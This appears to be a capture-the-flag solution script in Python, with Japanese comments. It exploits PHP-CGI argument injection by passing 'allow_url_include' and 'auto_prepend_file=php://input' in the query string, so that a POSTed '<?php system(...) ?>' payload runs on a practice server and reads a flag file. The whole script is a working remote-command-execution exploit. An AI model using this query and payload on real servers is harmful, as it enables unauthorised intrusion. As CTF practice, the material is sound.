# allow_url_include=On
# auto_prepend_file=php://input
# ↑ この２つをクエリに追加
# POSTのデータを実行するように指定する

# =はURLで%3D

import requests

base_url = "https://ctfq.u1tramarine.blue/q12/"
query = '?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input'
# data = "<?php system('ls -a');?>"
data = "<?php system('cat flag_flag_flag.txt');?>"

url = base_url+query
response = requests.post(url, data=data)
print(response.text)